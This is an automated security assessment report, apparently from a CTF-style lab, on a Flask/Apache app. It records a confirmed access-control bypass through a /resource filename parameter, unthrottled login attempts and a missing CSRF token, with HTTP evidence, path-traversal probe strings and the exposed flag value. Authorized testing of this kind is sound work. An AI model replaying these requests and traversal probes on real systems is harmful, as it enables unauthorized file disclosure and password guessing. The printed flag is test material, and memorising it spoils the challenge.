# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — secret-exposure Protected secret file disclosed via /resource filename param (Apache access control bypass)](#finding-1)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [2. LOW — rate-limit No rate limiting or account lockout on POST /login (brute-force / credential stuffing enabled)](#finding-2)
    - [3. INFO — csrf Login form has no anti-CSRF token (login CSRF possible)](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0j3bwc-bi9jp9` |
| Target | http://target.local:32800/ |
| Started | 2026-06-30T10:53:21.543Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 1 mapped · 1 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 1 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32800`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

1 finding(s): 1 high

_Plus 2 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [secret-exposure] Protected secret file disclosed via /resource filename param (Apache access control bypass)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32800/

The Flask `/resource?filename=<path>` endpoint reads files out of the application's `static/` directory and returns them directly. Apache is configured to forbid direct access to `static/flag` (GET /static/flag → 403 Forbidden), but the Flask resource handler ignores that web-server access control: GET /resource?filename=flag returns HTTP 200 with the full contents of the protected file — `flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}` (Content-Type: application/octet-stream). This is a broken-access-control / sensitive-file disclosure: an attacker can read any file the web server explicitly protects by requesting it through the alternate Flask endpoint. NOTE: true OS path traversal appears blocked — `../`, URL-encoded `..%2f`, nested `....//`, and absolute `/etc/passwd` all returned 404 (the handler is sandboxed to the static base, likely werkzeug safe_join) — so impact is scoped to files served from the static directory, but that directory includes the protected secret. The exposed value is a live, in-scope secret.

**Reproduction**

```
1. Confirm the file is protected by the web server: `GET http://target.local:32800/static/flag` → 403 Forbidden (Apache). 2. Bypass via the Flask file endpoint: `GET http://target.local:32800/resource?filename=flag` → 200 OK, body = `flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}`. 3. Repeat step 2 — same secret returned every time (stable). The `/resource` endpoint was discovered from the login page's `<link href="/resource?filename=css/bootstrap.min.css">` reference.
```

**Evidence**

- Evidence `ev-mr0jfk6c-1c` — `artifacts/_/ev-mr0jfk6c-1c/`

Request:

```http
GET /static/flag HTTP/1.1
Host: target.local:32800
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 322
content-type: text/html; charset=iso-8859-1
date: Tue, 30 Jun 2026 11:02:51 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.67 (Debian)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.67 (Debian) Server at target.local Port 32800</address>
</body></html>
```

- Evidence `ev-mr0jeifc-17` — `artifacts/_/ev-mr0jeifc-17/`

Request:

```http
GET /resource?filename=flag HTTP/1.1
Host: target.local:32800
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
cache-control: no-cache
connection: Keep-Alive
content-disposition: inline; filename=flag
content-length: 42
content-type: application/octet-stream
date: Tue, 30 Jun 2026 11:02:02 GMT
etag: "1782816728.0-42-2145194261"
keep-alive: timeout=5, max=100
last-modified: Tue, 30 Jun 2026 10:52:08 GMT
server: Apache/2.4.67 (Debian)

flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}
```

- Evidence `ev-mr0jfjy1-1b` — `artifacts/_/ev-mr0jfjy1-1b/`

Request:

```http
GET /resource?filename=flag HTTP/1.1
Host: target.local:32800
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
cache-control: no-cache
connection: Keep-Alive
content-disposition: inline; filename=flag
content-length: 42
content-type: application/octet-stream
date: Tue, 30 Jun 2026 11:02:51 GMT
etag: "1782816728.0-42-2145194261"
keep-alive: timeout=5, max=100
last-modified: Tue, 30 Jun 2026 10:52:08 GMT
server: Apache/2.4.67 (Debian)

flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-2"></a>

### 2. [SUSPECTED] [LOW] [rate-limit] No rate limiting or account lockout on POST /login (brute-force / credential stuffing enabled)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32800/

**Anomaly (why this is a lead):** Sent 10 consecutive failed POST /login attempts (admin/rl1..rl10) in rapid succession from a single client; every one returned an identical 302 → /login with no 429, no Retry-After header, no progressive delay and no account lockout. The login endpoint enforces no brute-force or rate-limit control, so online password guessing / credential stuffing is unthrottled.

POST /login applies no rate limiting, throttling, CAPTCHA, or account-lockout after repeated failed authentications. Ten rapid wrong-password attempts for the same username all returned the standard failed-login 302 with no 429/Retry-After. An attacker can run unlimited online brute-force or credential-stuffing against any account. (Recorded as suspected: the bug is the absence of a control, so a differential negative-control cannot be produced; the evidence is the uniform burst of unthrottled responses.)

**Reproduction**

```
Send POST /login (Content-Type: application/x-www-form-urlencoded, body username=admin&password=rlN) ~10+ times in quick succession from the same client. Observe every response is HTTP 302 Location:/login with no 429, no Retry-After, no lockout — e.g. evidence ev-mr0j7szr-k … ev-mr0j82gi-t.
```

**Evidence**

- Evidence `ev-mr0j82gi-t` — `artifacts/s-0001/ev-mr0j82gi-t/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32800
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=admin&password=rl10
```

Response:

```http
HTTP/1.1 302
connection: Keep-Alive
content-length: 199
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:57:02 GMT
keep-alive: timeout=5, max=91
location: /login
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

<a id="finding-3"></a>

### 3. [SUSPECTED] [INFO] [csrf] Login form has no anti-CSRF token (login CSRF possible)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32800/

**Anomaly (why this is a lead):** The /login form (GET /login) contains only username and password inputs and no hidden anti-CSRF token field; POST /login accepts a cross-site-forgeable form submission. This enables login-CSRF (forcing a victim's browser to authenticate as an attacker-controlled account). Classic authenticated-state-change CSRF does not apply here because no session cookie is issued pre-auth.

The login form lacks any CSRF protection token. While POST /login is unauthenticated (so cookie-riding authenticated-state-change CSRF is N/A — no session cookie exists before login), the absence of a token allows login-CSRF: an attacker can auto-submit the login form to silently log a victim into an attacker-controlled account. Informational severity.

**Reproduction**

```
GET /login (ev-mr0j5p76-4) and inspect the form — it has action=/login method=post with only username + password inputs and no hidden _csrf/csrf_token field. A cross-site auto-submitting form to POST /login would be accepted.
```

**Evidence**

- Evidence `ev-mr0j5p76-4` — `artifacts/s-0001/ev-mr0j5p76-4/`

Request:

```http
GET /login HTTP/1.1
Host: target.local:32800
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 2940
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 10:55:11 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/resource?filename=css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                                <div class="invalid-feedback">
                                    Please provide a username.
                                </div>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                                <div class="invalid-feedback">
                                    Please provide a password.
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        <!-- Alert for displaying login errors -->
                        <div id="loginAlert" class="alert alert-danger mt-3 d-none" role="alert">
                            Incorrect username or password. Please try again.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/resource?filename=js/bootstrap.bundle.min.js"></script>
    
    <!-- Custom JavaScript for login form -->
    <script>
        // Get the form element
        const form = document.getElementById('loginForm');

        // Add event listener to form submission
        form.addEventListener('submit', function(event) {
            // Prevent the form from submitting
            event.preventDefault();

            // Perform your own validation here if needed
            // For simplicity, let's just show an alert
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;


            // Always display error message
            document.getElementById('loginAlert').classList.remove('d-none');

        });
    </script>
</body>
</html>
```
